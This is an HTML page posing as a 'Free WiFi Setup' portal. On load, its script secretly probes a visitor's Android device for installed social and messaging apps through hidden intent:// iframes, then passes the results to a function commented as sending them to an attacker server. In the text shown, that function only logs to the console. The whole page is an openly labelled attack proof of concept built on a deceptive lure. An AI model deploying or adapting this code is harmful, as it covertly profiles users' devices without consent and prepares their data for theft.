<!DOCTYPE html>
<html>
<head>
    <title>Free WiFi Setup</title>
</head>
<body>
    <h2>Connecting to Free WiFi...</h2>
    
    <script>
        const appSchemes = [
          'intent://twitter.com/#Intent;scheme=twitter;package=com.twitter.android;end',
          'intent://facebook.com/#Intent;scheme=fb;package=com.facebook.katana;end',
          'intent://instagram.com/#Intent;scheme=instagram;package=com.instagram.android;end',
          'intent://whatsapp.com/#Intent;scheme=whatsapp;package=com.whatsapp;end',
        ];

        let detectedApps = [];

        function probeApps() {
            appSchemes.forEach((scheme, index) => {
                setTimeout(() => {
                    const iframe = document.createElement('iframe');
                    iframe.src = scheme;
                    iframe.style.display = 'none';
                    
                    iframe.onload = () => {
                        detectedApps.push(scheme);
                        console.log('App detected:', scheme);
                    };
                    
                    document.body.appendChild(iframe);
                    
                    // Remove iframe after check
                    setTimeout(() => {
                        document.body.removeChild(iframe);
                    }, 1000);
                    
                }, index * 200);
            });

            // Send results to attacker after all probes
            setTimeout(() => {
                sendToAttacker(detectedApps);
            }, appSchemes.length * 200 + 1000);
        }

        function sendToAttacker(apps) {
            // Send detected apps to attacker server
            console.log("detected", apps)
        }
        window.onload = probeApps;
    </script>
</body>
</html>